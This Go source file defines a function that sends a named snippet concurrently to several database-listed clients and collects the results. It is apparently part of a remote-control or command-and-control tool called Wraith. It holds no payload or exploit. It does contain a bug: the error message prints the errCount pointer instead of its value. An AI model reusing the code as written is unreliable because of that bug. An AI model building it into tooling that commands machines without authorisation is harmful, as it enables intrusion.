package snippets

import (
	"fmt"
	"strings"
	"sync"
	"sync/atomic"

	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/cmd/pc3/lib"
)

func snippetSendto(ctx lib.CommandContext, arg string) (string, error) {
	targetsArg, otherArgs, _ := strings.Cut(arg, " ")
	snippetName, otherArgs, _ := strings.Cut(otherArgs, " ")
	targets := strings.Split(targetsArg, ",")

	snippet, exists := Snippets[snippetName]
	if !exists {
		return "", fmt.Errorf("snippet `%s` not found", snippetName)
	}

	clients, err := ctx.State.ClientsGet(targets)
	if err != nil {
		return "", fmt.Errorf("could not get clients from the database: %s", err.Error())
	}

	var wg sync.WaitGroup
	wg.Add(len(clients))

	results := make([]string, len(clients))
	errCount := new(uint64)
	for index, client := range clients {
		go func(index int, client lib.Client) {
			defer wg.Done()

			result, err := snippet(ctx, fmt.Sprintf("%s %s", client.Address, otherArgs))
			if err != nil {
				atomic.AddUint64(errCount, 1)
			} else {
				results[index] = result
			}
		}(index, client)
	}

	wg.Wait()

	if *errCount > 0 {
		err = fmt.Errorf("%d sends errored", errCount)
	}

	return fmt.Sprintf("sent to %d clients:\n\n%s", len(clients), strings.Join(results, "\n\n")), err
}
